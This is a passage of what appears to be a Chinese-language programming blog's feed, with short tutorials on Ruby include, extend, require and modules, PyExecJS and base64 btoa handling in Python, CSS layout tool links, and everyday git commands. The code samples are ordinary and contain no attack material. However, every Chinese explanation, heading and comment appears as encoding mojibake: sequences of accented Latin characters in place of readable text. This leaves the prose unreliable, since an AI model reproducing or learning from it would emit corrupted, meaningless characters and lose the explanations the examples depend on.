        <content type="html"><![CDATA[<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>include ç›¸å½“äºå°†æ¨¡å—å®šä¹‰çš„æ–¹æ³•å’Œå¸¸é‡æ’å…¥åˆ°ç±»ä¸­ï¼Œmixinçš„èƒ½åŠ›å¯ä»¥å®ç°å¤šç»§æ‰¿ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Log</span> </span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">class_type</span></span></span><span class="line">    <span class="hljs-string">&quot;This class is of type: <span class="hljs-subst">#&#123;<span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>&#125;</span>&quot;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> </span></span><span class="line">  <span class="hljs-keyword">include</span> Log </span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">tc = TestClass.new.class_type</span><span class="line">puts tc <span class="hljs-comment">#This class is of type: TestClass</span></span></code></pre></div></div><h2 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h2><p>extend ç”¨äºæ·»åŠ ç±»æ–¹æ³•è€Œä¸æ˜¯includeçš„å®ä¾‹æ–¹æ³•ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Log</span></span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">class_type</span></span></span><span class="line">    <span class="hljs-string">&quot;This class is of type: <span class="hljs-subst">#&#123;<span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>&#125;</span>&quot;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span></span><span class="line">  extend Log</span><span class="line">  <span class="hljs-comment"># ...</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">tc = TestClass.class_type</span><span class="line">puts tc  <span class="hljs-comment"># This class is of type: TestClass</span></span></code></pre></div></div><h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>ç”¨äºåŠ è½½åº“ï¼Œå¹¶é˜»æ­¢å¤šæ¬¡åŠ è½½ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">test_libary.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts <span class="hljs-string">&quot; load this libary &quot;</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test_require.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line"><span class="hljs-comment"># ç»“æœä¸º</span></span><span class="line"><span class="hljs-comment">#  load this libary </span></span><span class="line"><span class="hljs-comment"># true</span></span><span class="line"><span class="hljs-comment"># false</span></span><span class="line"><span class="hljs-comment"># false</span></span></code></pre></div></div><h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>åŒæ ·ç”¨äºåŠ è½½åº“ï¼Œä½†æ˜¯ä¸ä¼šé˜»æ­¢å¤šæ¬¡åŠ è½½ã€‚ç”¨äºæ¨¡å—çš„çŠ¶æ€ç»å¸¸å‘ç”Ÿå˜åŒ–çš„æƒ…å†µ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span>  <span class="hljs-comment">#åœ¨è¿™é‡Œä¸èƒ½çœç•¥ .rb, requireå¯ä»¥çœç•¥</span></span><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span> </span><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span> </span><span class="line"><span class="hljs-comment">#ç»“æœ</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span></code></pre></div></div><h2 id="require-relative"><a href="#require-relative" class="headerlink" title="require_relative"></a>require_relative</h2><p>ç›¸å¯¹ä½ç½®çš„å¼•ç”¨</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">require_relative(<span class="hljs-string">&#x27;path&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># equal to</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">require</span>(File.expand_path(<span class="hljs-string">&#x27;path&#x27;</span>, File.dirname(<span class="hljs-keyword">__FILE__</span>)))</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ruby module æ¨¡å—</title>
      <link href="/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>Ruby ä¸­çš„æ¨¡å—æä¾›äº†ä¸€ä¸ªç‹¬ç«‹çš„å‘½åç©ºé—´ï¼Œå¯ä»¥æ”¾ç½®æ–¹æ³•å’Œå¸¸é‡ï¼Œç”šè‡³æ˜¯å˜é‡ã€‚</p><h2 id="å®ä¾‹æ–¹æ³•å’Œå¸¸é‡çš„ä½¿ç”¨"><a href="#å®ä¾‹æ–¹æ³•å’Œå¸¸é‡çš„ä½¿ç”¨" class="headerlink" title="å®ä¾‹æ–¹æ³•å’Œå¸¸é‡çš„ä½¿ç”¨"></a>å®ä¾‹æ–¹æ³•å’Œå¸¸é‡çš„ä½¿ç”¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_method</span></span></span><span class="line">    puts <span class="hljs-string">&#x27;Hello&#x27;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line">  MY_CONSTANT = <span class="hljs-string">&#x27;constant&#x27;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># é€šè¿‡æ¨¡å—è·å–å¸¸é‡</span></span><span class="line">puts MyModule::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span></span><span class="line">  <span class="hljs-keyword">include</span> MyModule</span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># é€šè¿‡å®ä¾‹ä½¿ç”¨æ–¹æ³•</span></span><span class="line">Foo.new.my_method <span class="hljs-comment"># =&gt; &quot;Hello&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># é€šè¿‡ç±»è·å–å¸¸é‡</span></span><span class="line">puts Foo::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span></code></pre></div></div><h2 id="ä½¿ç”¨æ¨¡å—çš„å˜é‡å’Œæ¨¡å—æ–¹æ³•"><a href="#ä½¿ç”¨æ¨¡å—çš„å˜é‡å’Œæ¨¡å—æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ¨¡å—çš„å˜é‡å’Œæ¨¡å—æ–¹æ³•"></a>ä½¿ç”¨æ¨¡å—çš„å˜é‡å’Œæ¨¡å—æ–¹æ³•</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> &lt;&lt; self</span></span><span class="line">    <span class="hljs-keyword">attr_accessor</span> <span class="hljs-symbol">:module_var</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">module_method</span></span></span><span class="line">      puts <span class="hljs-string">&quot;module_method&quot;</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-keyword">self</span>.module_var = <span class="hljs-string">&quot;module_var&quot;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">puts MyModule.module_var  <span class="hljs-comment"># =&gt; &quot;module_var&quot;</span></span><span class="line">MyModule.module_method  <span class="hljs-comment"># =&gt; &quot;module_method&quot;</span></span></code></pre></div></div><h2 id="å»ºç«‹å±‚çº§å…³ç³»"><a href="#å»ºç«‹å±‚çº§å…³ç³»" class="headerlink" title="å»ºç«‹å±‚çº§å…³ç³»"></a>å»ºç«‹å±‚çº§å…³ç³»</h2><p>ç±»ä¼¼äºpythonçš„importå±‚çº§ï¼Œrubyå¯ä»¥ç”¨moduleæ¥å»ºç«‹å±‚çº§å…³ç³»ï¼Œåœ¨moduleä¸­å†<code>require</code>å…¶ä»–çš„module.</p><p>è¿™é‡Œå°±æœ‰ä¸ªè®¾è®¡æŠ€å·§ï¼Œå°†<code>core</code>ä¸­<code>require</code>æ‰€æœ‰ä¸‹ä¸€ä¸ªå±‚çº§ï¼Œè¿™æ ·includeçš„æ—¶å€™å°±ä¸ç”¨å†<code>require</code>äº†ã€‚</p><p>ä¾‹å¦‚ï¼š</p><div class="codeBlockContainer"><div class="codeBlockTitle">core.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-comment"># All in this require </span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Aio</span></span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># debugger</span></span><span class="line">  <span class="hljs-comment">#require &#x27;byebug&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># License</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/license&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># UI</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/ui&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Base</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/base&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Text</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/text&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Module</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module_manager&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module_loader&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Warning</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/warning&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Device</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/device&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/device_manager&quot;</span></span></code></pre></div></div><p>å…¶ä»–æ–‡ä»¶åªéœ€è¦<code>require &#39;core&#39;</code>å°±å¯ä»¥äº†</p><div class="codeBlockContainer"><div class="codeBlockTitle">other_file.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;core&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">include</span> Aio::UI</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python æ¨¡æ‹Ÿjs</title>
      <link href="/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/"/>
      <url>/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/</url>
      
        <content type="html"><![CDATA[<p>æ¨èä½¿ç”¨<code>PyExecJS</code></p><h2 id="PyExecJS"><a href="#PyExecJS" class="headerlink" title="PyExecJS"></a>PyExecJS</h2><p>éœ€è¦å®‰è£…ä¾èµ–åŒ…</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">pip3 <span class="hljs-keyword">install</span> PyExecJS</span></code></pre></div></div><p>ç„¶åè°ƒç”¨</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> execjs</span><span class="line"></br></span><span class="line">js_code = <span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">function add(num1, num2) &#123;</span></span><span class="line"><span class="hljs-string">    return num1 + num2;</span></span><span class="line"><span class="hljs-string">&#125;</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line">js_comp = execjs.<span class="hljs-built_in">compile</span>(js_code)</span><span class="line"></br></span><span class="line">js_comp.call(<span class="hljs-string">&#x27;add&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></code></pre></div></div><p>å…¶ä»–æ–¹å¼å¯ä»¥å‚è€ƒ<a href="https://cloud.tencent.com/developer/article/1670121">è¿™ç¯‡æ–‡ç« </a></p><h2 id="btoa"><a href="#btoa" class="headerlink" title="btoa"></a>btoa</h2><p>å…³äºjsçš„Base64ç¼–ç ï¼Œå¾ˆå¤šéƒ½æ˜¯ä½¿ç”¨çš„<code>btoa</code>çš„æ–¹å¼æ¥çš„ã€‚</p><p>ä½†æ˜¯ç”±äºpythonç›´æ¥è°ƒç”¨base64.encode()æ–¹æ³•ä¼šä¸ä¸€æ ·ï¼Œæ‰€ä»¥éœ€è¦åšä¸‹ä¿®æ”¹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> base64</span><span class="line"><span class="hljs-comment"># atob</span></span><span class="line">s = base64.b64decode(<span class="hljs-string">&quot;å¾…è§£ç çš„å­—ç¬¦&quot;</span>.encode(<span class="hljs-string">&quot;utf8&quot;</span>)).decode(<span class="hljs-string">&quot;latin1&quot;</span>)</span><span class="line"><span class="hljs-comment"># btoa</span></span><span class="line">s = base64.b64encode(<span class="hljs-string">&quot;å¾…ç¼–ç çš„å­—ç¬¦&quot;</span>.encode(<span class="hljs-string">&quot;latin1&quot;</span>)).decode(<span class="hljs-string">&quot;utf8&quot;</span>)</span></code></pre></div></div><p>è‡³äºè§£é‡Šï¼Œå¯ä»¥å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/148364711">è¿™ç¯‡æ–‡ç« </a></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>css å¸ƒå±€å·¥å…·</title>
      <link href="/2021/09/14/css-%E5%B8%83%E5%B1%80%E5%B7%A5%E5%85%B7/"/>
      <url>/2021/09/14/css-%E5%B8%83%E5%B1%80%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://csslayout.io/">csslayout</a></li><li><a href="https://cssgr.id/">cssgr</a></li><li><a href="https://grid.layoutit.com/">grid</a></li><li><a href="https://flukeout.github.io/">cssdiner</a></li><li><a href="https://loading.io/">loading.ioâ€‹</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git ä½¿ç”¨</title>
      <link href="/2021/09/07/git-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/09/07/git-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://progit.bootcss.com/">Pro Git ç¬¬äºŒç‰ˆä¸­æ–‡, ç½‘ç«™</a><br><a href="https://oschina.gitee.io/learn-git-branching/">è¿™ä¸ª</a>æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å­¦ä¹ ç½‘ç«™<br><a href="https://learngitbranching.js.org/?NODEMO=&locale=zh_CN">è¿™é‡Œ</a>æ˜¯ä¸€ä¸ªDEMOç½‘ç«™</p><h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>ä½¿ç”¨ <code>git commmit --amend</code> æ¥æäº¤ä¸€ä¸ªå¹³è¡Œçš„å˜æ›´</p><h3 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h3><ul><li>æŸ¥çœ‹æ ‡ç­¾ <code>git tag</code></li></ul><ul><li><p>é™„æ³¨æ ‡ç­¾<br><code>git tag -a v1.4 -m &#39;my version 1.4&#39;</code></p></li><li><p>è½»é‡æ ‡ç­¾<br><code>$ git tag v1.4-lw</code></p></li><li><p>åæœŸæ‰“æ ‡ç­¾<br><code>$ git tag -a v1.2 9fceb02</code></p></li><li><p>æ¨é€æ ‡ç­¾</p></li></ul><p><code>git push origin --tags</code></p><p><code>git push origin &lt;tag&gt;</code></p><h2 id="åˆå¹¶"><a href="#åˆå¹¶" class="headerlink" title="åˆå¹¶"></a>åˆå¹¶</h2><blockquote><p>åˆå¹¶å†²çªæ—¶ï¼Œä½¿ç”¨  git status æŸ¥çœ‹ï¼Œå†²çªæ–‡ä»¶ä¸­ä¼šæœ‰æ ‡è®°</p></blockquote><p>å¯ä»¥ä½¿ç”¨åˆå¹¶å·¥å…·é«˜æ•ˆå¤„ç† <code>git mergetool</code></p><blockquote><p>â€“merged ä¸ â€“no-merged è¿™ä¸¤ä¸ªæœ‰ç”¨çš„é€‰é¡¹å¯ä»¥è¿‡æ»¤è¿™ä¸ªåˆ—è¡¨ä¸­å·²ç»åˆå¹¶æˆ–å°šæœªåˆå¹¶åˆ°å½“å‰åˆ†æ”¯çš„åˆ†æ”¯ã€‚ â€“merge åœ¨è¿™ä¸ªåˆ—è¡¨ä¸­åˆ†æ”¯åå­—å‰æ²¡æœ‰ * å·çš„åˆ†æ”¯é€šå¸¸å¯ä»¥ä½¿ç”¨ git branch -d åˆ é™¤æ‰ï¼›ä½ å·²ç»å°†å®ƒä»¬çš„å·¥ä½œæ•´åˆåˆ°äº†å¦ä¸€ä¸ªåˆ†æ”¯ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå¤±å»ä»»ä½•ä¸œè¥¿ã€‚</p></blockquote><h3 id="å­˜å‚¨ä¸´æ—¶æœªæäº¤çš„å†…å®¹"><a href="#å­˜å‚¨ä¸´æ—¶æœªæäº¤çš„å†…å®¹" class="headerlink" title="å­˜å‚¨ä¸´æ—¶æœªæäº¤çš„å†…å®¹"></a>å­˜å‚¨ä¸´æ—¶æœªæäº¤çš„å†…å®¹</h3><p>å½“é‡åˆ°éœ€è¦ä¸´æ—¶å­˜å‚¨çš„æ—¶å€™ï¼Œä½¿ç”¨<code>git stash</code>æ¥è¿›è¡Œå­˜å‚¨</p><p>ä½¿ç”¨ <code>git stash list</code> æŸ¥çœ‹å­˜å‚¨å†…å®¹</p><p>ä½¿ç”¨ <code>git stash pop</code> æ¥æ¢å¤å­˜å‚¨å†…å®¹</p><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><p>è¿™ä¸ªä¸åŒä¸<code>base</code>ï¼Œå¯ä»¥å•ç‹¬å°†å…¶ä»–åˆ†æ”¯çš„ä¸€ä¸ªæäº¤æ”¾åˆ°æœ¬åˆ†æ”¯ä¸Šæ¥</p><p><code>git cherry-pick c3</code></p><h3 id="å˜åŸº"><a href="#å˜åŸº" class="headerlink" title="å˜åŸº"></a>å˜åŸº</h3><p>å…¶å®ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šä½ å¯ä»¥æå–åœ¨ C4 ä¸­å¼•å…¥çš„è¡¥ä¸å’Œä¿®æ”¹ï¼Œç„¶ååœ¨ C3 çš„åŸºç¡€ä¸Šåº”ç”¨ä¸€æ¬¡ã€‚ åœ¨ Git ä¸­ï¼Œè¿™ç§æ“ä½œå°±å«åš å˜åŸºã€‚ ä½ å¯ä»¥ä½¿ç”¨ rebase å‘½ä»¤å°†æäº¤åˆ°æŸä¸€åˆ†æ”¯ä¸Šçš„æ‰€æœ‰ä¿®æ”¹éƒ½ç§»è‡³å¦ä¸€åˆ†æ”¯ä¸Šï¼Œå°±å¥½åƒâ€œé‡æ–°æ’­æ”¾â€ä¸€æ ·ã€‚</p><p>åœ¨éœ€è¦ä½¿ç”¨äº¤äº’æ–¹å¼çš„æ—¶å€™åŠ ä¸Š <code>-i</code> å³å¯</p><p>æ³¨æ„å˜åŸºæ—¶å€™çš„æ–¹å‘, å¤§å¤šæ•°æƒ…å†µä½¿ç”¨ <code>cherry-pick</code>ä¼šæ›´å¥½</p><p><code>$ git rebase &lt;ç›®çš„åˆ†æ”¯&gt; &lt;å°†è¢«ç§»åŠ¨çš„åˆ†æ”¯&gt;</code></p><p><strong>ä¸è¦å¯¹åœ¨ä½ çš„ä»“åº“å¤–æœ‰å‰¯æœ¬çš„åˆ†æ”¯æ‰§è¡Œå˜åŸºã€‚</strong></p><h2 id="æ‹‰å–"><a href="#æ‹‰å–" class="headerlink" title="æ‹‰å–"></a>æ‹‰å–</h2><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><ul><li>å…‹éš†ä¸€ä¸ªé¡¹ç›®åˆ°æœ¬åœ°</li></ul><p><code>git clone &lt;url&gt; --depth=1</code></p><p>è¿™æ ·å°±å¯ä»¥æ‹‰å–æœ€æ–°çš„ç‰ˆæœ¬ï¼Œä¸ä¼šæœ‰å†å²ç‰ˆæœ¬</p><p>å½“åé¢æƒ³æ‹‰å–æ‰€æœ‰ç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>git fetch --unshallow</code></p><h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><ul><li>æ‹‰å–è¿œç«¯åˆ°æœ¬åœ°æ–°åˆ†æ”¯</li></ul><p><code>git fetch origin master:&lt;new_branch&gt;</code></p><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p><code>git pull</code> åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å®ƒçš„å«ä¹‰æ˜¯ä¸€ä¸ª <code>git fetch</code> ç´§æ¥ç€ä¸€ä¸ª <code>git merge</code> å‘½ä»¤</p><p>forkçš„ä»“åº“ï¼Œæ‹‰å–ä¸»ä»“å†…å®¹</p><p><code>git pull &lt;ä¸»ä»“åœ°å€&gt; &lt;branch&gt;</code></p><p>ä¾‹å¦‚ï¼š</p><p><code>git pull https://github.com/networktocode/ntc-templates.git master</code></p><p>ä¹Ÿå¯ä»¥å•ç‹¬å¯¹æŸä¸ªcommitè¿›è¡Œæ‹‰å–</p><h2 id="é€€å›ä¸æ¢å¤"><a href="#é€€å›ä¸æ¢å¤" class="headerlink" title="é€€å›ä¸æ¢å¤"></a>é€€å›ä¸æ¢å¤</h2><h3 id="æ¢å¤çš„æ–¹æ³•"><a href="#æ¢å¤çš„æ–¹æ³•" class="headerlink" title="æ¢å¤çš„æ–¹æ³•"></a>æ¢å¤çš„æ–¹æ³•</h3><p>é‡ç‚¹åœ¨äºåˆ—å‡ºæ‰€æœ‰çš„commit<br><code>git reflog</code></p><p>ç„¶å<code>checkout</code>åˆ°commit-idä¸Šå°±å¯ä»¥äº†</p><h3 id="å›é€€çš„ä¸¤ç§æ–¹æ³•"><a href="#å›é€€çš„ä¸¤ç§æ–¹æ³•" class="headerlink" title="å›é€€çš„ä¸¤ç§æ–¹æ³•"></a>å›é€€çš„ä¸¤ç§æ–¹æ³•</h3><p>ä¸¤ç§å›é€€æ–¹å¼åº”è¯¥æ˜¯<code>reset</code>å’Œ<code>revert</code>ï¼Œå…¶ä¸­<code>reset</code>æ˜¯æœ¬åœ°é€€åï¼Œæœ¬è´¨æ˜¯checkoutï¼Œè€Œ<code>revert</code>çš„æœ¬è´¨æ˜¯å°†è¦é€€çš„åœ°æ–¹æäº¤ä¸€ä¸ªæ–°çš„commitã€‚</p><ul><li><code>git reset HEAD~</code></li><li><code>git revert HEAD</code></li></ul><ul><li>ä½¿ç”¨<code>reset</code>å›é€€</li><li>ä½¿ç”¨<code>checkout</code>å›é€€</li></ul><h4 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h4><p>åˆ†ä¸º<strong>soft</strong> å’Œ <strong>hard</strong> ä¸¤ç§ï¼Œ<strong>soft</strong>åªä¼šå›é€€çŠ¶æ€ï¼Œä¸ä¼šæ”¹å˜ä»£ç ã€‚<strong>hard</strong>å›é€€ä¼šæ”¹å˜ä»£ç ã€‚é»˜è®¤æ˜¯<strong>soft</strong></p><p><code>git reset --hard [commit-id]</code></p><p>æ¢å¤å³å¯æ‰¾åˆ°ä¹‹å‰çš„commit-idå†reset</p><p>å°½é‡ä¸è¦ä½¿ç”¨<code>--hard</code></p><h4 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h4><p>ä½¿ç”¨<code>checkout</code>æ›´åŠ çš„å®‰å…¨æ–¹ä¾¿<br><code>git checkout [commit-id]</code> å°†HEADæ”¾åˆ°è¿™ä¸ªæ–°çš„åˆ†æ”¯ä¸­, å†åœ¨è¿™ä¸ªåˆ†æ”¯ä¸­ä¿®æ”¹æäº¤åã€‚<code>git checkout master</code> ç„¶å<code>git merge [branch-id]</code> å³å¯</p><p>æˆ–è€…ç›´æ¥ä½¿ç”¨ <code>git branch -f [branch-id] &lt;commit-id&gt;</code> å°†è¿™ä¸ªåˆ†æ”¯æŒ‡å‘è¿™ä¸ªcommit</p><h4 id="æ”¾å¼ƒè·Ÿè¸ªæ–‡ä»¶"><a href="#æ”¾å¼ƒè·Ÿè¸ªæ–‡ä»¶" class="headerlink" title="æ”¾å¼ƒè·Ÿè¸ªæ–‡ä»¶"></a>æ”¾å¼ƒè·Ÿè¸ªæ–‡ä»¶</h4><p><code>git rm -r --cache &lt;file_path&gt;</code> ä¸åˆ é™¤æœ¬åœ°æ–‡ä»¶</p><h3 id="å›é€€å•ä¸ªæ–‡ä»¶çš„æ–¹æ³•"><a href="#å›é€€å•ä¸ªæ–‡ä»¶çš„æ–¹æ³•" class="headerlink" title="å›é€€å•ä¸ªæ–‡ä»¶çš„æ–¹æ³•"></a>å›é€€å•ä¸ªæ–‡ä»¶çš„æ–¹æ³•</h3><p>å…¶å®<code>git log</code> å’Œ<code>git checkout</code> åé¢éƒ½å¯ä»¥å¸¦å•ä¸ªæ–‡ä»¶</p><p>æ‰€ä»¥æ˜¯</p><ol><li><code>git log &lt;file&gt;</code>æ¥æŸ¥çœ‹æ­¤æ–‡ä»¶çš„å†å²æäº¤</li><li><code>git checkout &lt;hash&gt; &lt;file&gt;</code>æ¥æ¢å¤ç‰¹å®šç‰ˆæœ¬</li></ol><h3 id="å¼ºåˆ¶è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯"><a href="#å¼ºåˆ¶è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯" class="headerlink" title="å¼ºåˆ¶è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯"></a>å¼ºåˆ¶è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯</h3><p><code>git branch -f &lt;master&gt; &lt;other_c&gt;</code></p><h2 id="ignore-é—®é¢˜"><a href="#ignore-é—®é¢˜" class="headerlink" title=".ignore é—®é¢˜"></a>.ignore é—®é¢˜</h2><p>å¯¹äºtrackè¿‡çš„æ–‡ä»¶ï¼Œåé¢çš„æ›´æ”¹ä¸æƒ³æäº¤å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">å·²ç»ç»´æŠ¤èµ·æ¥çš„æ–‡ä»¶ï¼Œå³ä½¿åŠ ä¸Šäº†gitignoreï¼Œä¹Ÿæ— æµäºäº‹ã€‚</span><span class="line">ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š</span><span class="line">git <span class="hljs-keyword">update</span>-<span class="hljs-keyword">index</span> <span class="hljs-comment">--assume-unchanged logs/*.log</span></span><span class="line"></br></span><span class="line">è¿™æ 